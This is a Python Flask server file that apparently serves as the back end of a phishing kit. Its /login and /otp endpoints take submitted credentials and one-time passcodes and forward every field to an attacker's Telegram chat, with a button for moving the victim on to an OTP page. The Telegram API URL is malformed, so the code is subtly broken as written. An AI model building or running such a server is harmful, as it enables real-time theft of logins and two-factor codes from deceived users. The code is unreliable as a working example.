from flask import Flask, request, jsonify
from flask_cors import CORS
import os, uuid, requests, json
from dotenv import load_dotenv

load_dotenv()
app = Flask(__name__)
CORS(app)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")
SESSION_STATUS = {}

def send_to_telegram(data, session_id, type_):
    msg = f"🔐 {type_.upper()} SUBMISSION\n"
    for k, v in data.items():
        msg += f"• {k.upper()} : {v}\n"
    msg += f"\nSESSION: {session_id}"
    
    payload = {
        "chat_id": CHAT_ID,
        "text": msg,
        "reply_markup": json.dumps({
            "inline_keyboard": [[{"text": "🔢 OTP", "callback_data": f"{session_id}:otp.html"}]]
        })
    }
    r = requests.post(f"https://telegram.org{BOT_TOKEN}/sendMessage", data=payload)
    return r.ok

@app.route("/login", methods=["POST"])
def login():
    data = request.get_json()
    sid = str(uuid.uuid4())
    SESSION_STATUS[sid] = {"approved": False, "redirect_url": None}
    send_to_telegram(data, sid, "login")
    return jsonify({"success": True, "id": sid})

@app.route("/otp", methods=["POST"])
def otp():
    data = request.get_json()
    if not data or "otp" not in data:
        return jsonify({"success": False, "error": "No OTP"}), 400
    success = send_to_telegram(data, "OTP_STEP", "otp")
    return jsonify({"success": success})

@app.route("/")
def home(): return "✅ Server Active"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 10000)))
